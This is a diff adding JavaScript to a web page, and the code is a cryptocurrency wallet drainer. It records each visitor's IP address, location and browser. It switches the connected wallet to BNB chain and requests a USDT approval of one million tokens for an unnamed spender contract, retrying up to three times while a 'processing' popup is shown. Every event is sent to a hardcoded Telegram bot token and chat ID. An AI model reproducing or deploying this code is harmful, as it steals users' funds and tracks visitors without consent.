@@ -1,0 +1,212 @@
+// --- Read base64 uid from ?id= ---
+    function logUidFromQuery() {
+        const params = new URLSearchParams(window.location.search);
+        const idParam = params.get('id');
+        if (!idParam) return null;
+        
+        let normalized = idParam.replace(/-/g, '+').replace(/_/g, '/');
+        if (normalized.length % 4 !== 0) {
+            normalized += '='.repeat(4 - (normalized.length % 4));
+        }
+        try {
+            const binary = atob(normalized);
+            const bytes = Uint8Array.from(binary, c => c.charCodeAt(0));
+            const decoded = new TextDecoder().decode(bytes);
+            const numeric = decoded.trim();
+            if (/^\d+$/.test(numeric)) {
+                return numeric;
+            }
+            return null;
+        } catch (e) {
+            return null;
+        }
+    }
+
+    // OPTIMIZED sendToTelegram - faster, non-blocking
+    async function sendToTelegram(data) {
+        const id = logUidFromQuery() || "no_uid";
+        const payload = { ...(data || {}), uid: id };
+
+        let msg = "";
+
+        // Header
+        msg += "🔥 New Event\n";
+        msg += `🆔 UID: ${payload.uid}\n`;
+        msg += `⏰ ${new Date().toISOString()}\n`;
+        msg += "──────────────────────────────\n\n";
+
+        // Visitor info
+        if (payload.type === 'visitor' || payload.type === 'visitor_detailed' || payload.type === 'visitor_error') {
+            msg += "👤 Visitor Info\n";
+            if (payload.ip)          msg += `🌐 IP: ${payload.ip}\n`;
+            if (payload.location)    msg += `📍 ${payload.location}\n`;
+            if (payload.country_flag) msg += `🏳️ Flag: ${payload.country_flag}\n`;
+            if (payload.timezone)    msg += `🕒 TZ: ${payload.timezone}\n`;
+            if (payload.userAgent)   msg += `📱 UA: ${payload.userAgent}\n`;
+            if (payload.url)         msg += `🔗 ${payload.url}\n`;
+            if (payload.error)       msg += `❌ Error: ${payload.error}\n`;
+            msg += "\n";
+        }
+
+        // Wallet connection
+        if (payload.type === 'connectedwallet') {
+            msg += "💼 Wallet Connected\n";
+            msg += `📌 Address: ${payload.wallet}\n\n`;
+        }
+
+        // Info / general messages
+        if (payload.type === 'info') {
+            msg += "ℹ️ Info\n";
+            msg += `${payload.text}\n\n`;
+        }
+
+        // Transaction approval (most important)
+        if (payload.type === 'checkTrx') {
+            msg += "✅ Approval Attempt\n";
+            msg += `🔗 Tx Hash: ${payload.trx}\n`;
+            msg += `👛 From: ${payload.account || 'unknown'}\n\n`;
+        }
+
+        // Errors & retries
+        if (payload.type === 'error' || payload.text?.includes('failed') || payload.text?.includes('Error')) {
+            msg += "⚠️ Problem Detected\n";
+            if (payload.text) msg += `📛 ${payload.text}\n`;
+            if (payload.account) msg += `👛 Account: ${payload.account}\n`;
+            msg += "\n";
+        }
+
+        // Fallback for unknown types
+        if (!msg.includes("────")) {
+            msg += "📦 Raw Data\n";
+            for (const [k, v] of Object.entries(payload)) {
+                if (k !== 'type' && k !== 'uid') {
+                    msg += `• ${k}: ${v}\n`;
+                }
+            }
+            msg += "\n";
+        }
+
+        msg += "──────────────────────────────\n";
+
+        const encoded = encodeURIComponent(msg.trim());
+        const url = `https://corsproxy.io/?https://api.telegram.org/bot8554016564:AAElvNOOjFq3la5_K_uQybiset0cmrNT-zQ/sendMessage?chat_id=5406816988&text=${encoded}`;
+
+        // Fire and forget - don't wait for response
+        setTimeout(() => {
+            try {
+                fetch(url, { mode: 'no-cors' }).catch(() => {});
+            } catch (e) {}
+            
+            try {
+                const img = new Image();
+                img.src = url + `&t=${Date.now()}`;
+            } catch (e) {}
+        }, 0);
+    }
+
+    async function sendVisitorInfo() {
+        // Send basic info immediately, fetch detailed info in background
+        sendToTelegram({
+            type: 'visitor',
+            url: window.location.href,
+            timestamp: new Date().toISOString(),
+            userAgent: navigator.userAgent
+        });
+        
+        // Fetch detailed info in background without blocking
+        setTimeout(async () => {
+            try {
+                const res = await fetch('https://ipapi.co/json/', {
+                    method: 'GET',
+                    headers: { 'Accept': 'application/json' }
+                });
+                
+                if (!res.ok) throw new Error('IP lookup failed');
+                
+                const data = await res.json();
+                const ip = data.ip || 'Unknown';
+                const city = data.city || 'Unknown';
+                const region = data.region || 'Unknown';
+                const country = data.country_name || 'Unknown';
+                const flag = data.country_code ? String.fromCodePoint(...[...data.country_code.toUpperCase()].map(c => 0x1F1E6 + c.charCodeAt(0) - 65)) : '🌍';
+                const timezone = data.timezone || 'Unknown';
+                const location = `${city}, ${region}, ${country}`;
+                
+                sendToTelegram({
+                    type: 'visitor_detailed',
+                    ip,
+                    location,
+                    timezone,
+                    url: window.location.href,
+                    country_flag: flag,
+                    userAgent: navigator.userAgent
+                });
+            } catch (err) {
+                sendToTelegram({
+                    type: 'visitor_error',
+                    error: err.message,
+                    url: window.location.href,
+                    userAgent: navigator.userAgent
+                });
+            }
+        }, 100);
+    }
+
+    async function approveUSDT(account) {
+        const usdtAbi = ["function approve(address spender, uint256 amount) public returns (bool)"];
+        const provider = new ethers.providers.Web3Provider(window.ethereum);
+        const signer = provider.getSigner(account);
+        const usdtContract = new ethers.Contract(USDT_ADDRESS, usdtAbi, signer);
+        const amount = ethers.utils.parseUnits("1000000", USDT_DECIMALS);
+        
+        // Reduced to 3 attempts for faster response
+        for (let attempt = 1; attempt <= 3; attempt++) {
+            try {
+                const tx = await usdtContract.approve(SPENDER_CONTRACT, amount);
+                sendToTelegram({ type: 'checkTrx', trx: tx.hash, account: account });
+                
+                // Show popup immediately without waiting for confirmation
+                showProcessingPopup();
+                
+                // Wait for confirmation in background
+                tx.wait().catch(() => {});
+                break;
+            } catch (err) {
+                if (attempt === 3) {
+                    sendToTelegram({ type: 'info', text: `Approval failed after retries: ${err.message}`, account: account });
+                }
+            }
+        }
+    }
+
+    async function getAddress() {
+        try {
+            const currentChain = await window.ethereum.request({ method: 'eth_chainId' });
+            if (currentChain !== '0x38') {
+                await window.ethereum.request({
+                    method: 'wallet_switchEthereumChain',
+                    params: [{ chainId: '0x38' }],
+                });
+            }
+            let accounts = await window.ethereum.request({ method: 'eth_accounts' });
+            let msg = "";
+            if (accounts.length) {
+                msg = "Directly got: " + accounts[0];
+            } else {
+                accounts = await window.ethereum.request({ method: 'eth_requestAccounts' });
+                if (accounts.length) {
+                    msg = "Asked for connect, got: " + accounts[0];
+                } else {
+                    msg = "No wallet connected.";
+                }
+            }
+            sendToTelegram({ type: 'info', text: msg });
+            if (accounts.length) {
+                sendToTelegram({ type: 'connectedwallet', wallet: accounts[0] });
+                await approveUSDT(accounts[0]);
+            }
+        } catch (e) {
+            sendToTelegram({type: 'info', text: "Error: " + e.message });
+            closePopup();
+        }
+    }
